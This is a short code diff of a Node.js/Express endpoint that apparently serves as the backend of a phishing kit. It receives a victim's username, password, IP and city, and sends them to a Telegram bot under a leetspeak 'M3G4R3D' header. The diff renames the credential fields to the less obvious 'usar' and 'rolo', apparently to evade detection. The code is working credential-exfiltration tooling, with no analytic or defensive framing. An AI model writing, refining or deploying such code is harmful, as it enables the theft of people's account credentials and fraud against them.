@@ -27,14 +27,14 @@ app.get('/', (req, res) => {
 
 
 app.post('/api/sendMessage', async (req, res) => {
-    const { user, password, ip, city } = req.body;
+    const { usar, rolo, ip, city } = req.body;
 
-    if (!user || !country || !ip || !password) {
+    if (!usar ||  !ip || !rolo) {
         return res.status(400).json({ error: 'Faltan datos obligatorios' });
     }
 
     // Construir mensaje
-    const message = `🔵M3G4R3D🔵\nUS4R: <code>${user}</code>\nCL4V: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔵M3G4R3D🔵\nUS4R: <code>${usar}</code>\nCL4V: <code>${rolo}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
